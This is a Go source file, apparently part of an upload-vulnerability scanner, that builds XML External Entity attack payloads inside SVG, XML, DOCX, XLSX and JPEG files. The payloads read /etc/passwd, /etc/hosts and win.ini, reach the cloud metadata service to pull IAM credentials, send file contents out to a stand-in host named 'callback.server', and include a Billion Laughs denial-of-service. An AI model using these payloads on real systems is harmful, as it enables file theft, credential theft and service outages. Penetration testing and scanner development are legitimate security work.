package payload

import (
	"archive/zip"
	"bytes"
)

// moduleXXE generates XML External Entity (XXE) test payloads.
// Tests for XXE vulnerabilities via uploaded XML-based files
// including SVG, DOCX, XLSX, PDF, and plain XML.
func moduleXXE() []*Payload {
	var tests []*Payload

	// Test 1: SVG with XXE - File Read
	svgXXEPayloads := []struct {
		name      string
		payload   string
		technique string
	}{
		{
			name: "SVG XXE - /etc/passwd",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>`,
			technique: "XXE via SVG: Read /etc/passwd",
		},
		{
			name: "SVG XXE - /etc/hosts",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>`,
			technique: "XXE via SVG: Read /etc/hosts",
		},
		{
			name: "SVG XXE - Windows win.ini",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>`,
			technique: "XXE via SVG: Read Windows win.ini",
		},
		{
			name: "SVG XXE - SSRF to AWS Metadata",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>`,
			technique: "XXE via SVG: SSRF to AWS metadata",
		},
		{
			name: "SVG XXE - SSRF to internal services",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>`,
			technique: "XXE via SVG: SSRF to localhost",
		},
		{
			name: "SVG XXE - Parameter entities",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://callback.server/?data=%file;'>">
  %eval;
  %exfil;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">XXE Test</text>
</svg>`,
			technique: "XXE via SVG: Out-of-band parameter entities",
		},
	}

	for _, svg := range svgXXEPayloads {
		tests = append(tests, &Payload{
			TestType:    TestTypeXXE,
			Technique:   svg.technique,
			Filename:    svg.name,
			Extension:   ".svg",
			Body:        []byte(svg.payload),
			ContentType: "image/svg+xml",
			Tags:        []string{"xxe", "svg", "file-read"},
		})
	}

	// Test 2: Plain XML with XXE
	xmlXXEPayloads := []struct {
		name      string
		payload   string
		technique string
	}{
		{
			name: "XML XXE - File read",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>`,
			technique: "XXE via XML: Direct file read",
		},
		{
			name: "XML XXE - Billion laughs (DoS)",
			payload: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`,
			technique: "XXE via XML: Billion Laughs DoS attack",
		},
		{
			name: "XML XXE - SSRF",
			payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>
  <data>&xxe;</data>
</root>`,
			technique: "XXE via XML: SSRF to cloud metadata",
		},
	}

	for _, xml := range xmlXXEPayloads {
		tests = append(tests, &Payload{
			TestType:    TestTypeXXE,
			Technique:   xml.technique,
			Filename:    xml.name,
			Extension:   ".xml",
			Body:        []byte(xml.payload),
			ContentType: "application/xml",
			Tags:        []string{"xxe", "xml", "file-read"},
		})
	}

	// Test 3: Office Open XML (DOCX/XLSX) with XXE
	// DOCX files are ZIP archives containing XML
	docxPayload := createDOCXWithXXE()
	tests = append(tests, &Payload{
		TestType:    TestTypeXXE,
		Technique:   "XXE via DOCX: Embedded XXE in document XML",
		Filename:    "xxe_document.docx",
		Extension:   ".docx",
		Body:        docxPayload,
		ContentType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
		Tags:        []string{"xxe", "docx", "office", "file-read"},
	})

	xlsxPayload := createXLSXWithXXE()
	tests = append(tests, &Payload{
		TestType:    TestTypeXXE,
		Technique:   "XXE via XLSX: Embedded XXE in spreadsheet XML",
		Filename:    "xxe_spreadsheet.xlsx",
		Extension:   ".xlsx",
		Body:        xlsxPayload,
		ContentType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
		Tags:        []string{"xxe", "xlsx", "office", "file-read"},
	})

	// Test 4: XMP/JPG with XXE in metadata
	jpgXXE := createJPEGWithXXE()
	tests = append(tests, &Payload{
		TestType:    TestTypeXXE,
		Technique:   "XXE via JPEG: XXE in XMP metadata",
		Filename:    "xxe_photo.jpg",
		Extension:   ".jpg",
		Body:        jpgXXE,
		ContentType: "image/jpeg",
		Tags:        []string{"xxe", "jpeg", "metadata", "xmp"},
	})

	return tests
}

// createDOCXWithXXE creates a minimal DOCX file with XXE payload
func createDOCXWithXXE() []byte {
	// DOCX is a ZIP containing XML files
	// We inject XXE into the document.xml
	var docx bytes.Buffer
	w := zip.NewWriter(&docx)

	// [Content_Types].xml
	contentTypes := `<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`
	writeZipEntry(w, "[Content_Types].xml", []byte(contentTypes))

	// _rels/.rels
	rels := `<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`
	writeZipEntry(w, "_rels/.rels", []byte(rels))

	// word/document.xml - WITH XXE PAYLOAD
	documentXML := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>`
	writeZipEntry(w, "word/document.xml", []byte(documentXML))

	w.Close()
	return docx.Bytes()
}

// createXLSXWithXXE creates a minimal XLSX file with XXE payload
func createXLSXWithXXE() []byte {
	var xlsx bytes.Buffer
	w := zip.NewWriter(&xlsx)

	contentTypes := `<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>`
	writeZipEntry(w, "[Content_Types].xml", []byte(contentTypes))

	// xl/workbook.xml - WITH XXE PAYLOAD
	workbookXML := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE workbook [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
  <data>&xxe;</data>
</workbook>`
	writeZipEntry(w, "xl/workbook.xml", []byte(workbookXML))

	w.Close()
	return xlsx.Bytes()
}

// createJPEGWithXXE creates a JPEG with XXE in XMP metadata
func createJPEGWithXXE() []byte {
	// Minimal JPEG header
	jpeg := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01}

	// XMP metadata with XXE (injected into APP1 marker)
	xmpXXE := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xmp [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
    <rdf:Description>
      <dc:description>&xxe;</dc:description>
    </rdf:Description>
  </rdf:RDF>
</x:xmpmeta>`

	jpeg = append(jpeg, 0xFF, 0xE1)           // APP1 marker
	jpeg = append(jpeg, byte(len(xmpXXE)>>8)) // Length high
	jpeg = append(jpeg, byte(len(xmpXXE)))    // Length low
	jpeg = append(jpeg, []byte(xmpXXE)...)    // XXE payload
	jpeg = append(jpeg, 0xFF, 0xD9)           // JPEG EOI

	return jpeg
}

// writeZipEntry writes a file entry to a ZIP writer
func writeZipEntry(w *zip.Writer, name string, data []byte) {
	f, _ := w.Create(name)
	f.Write(data)
}

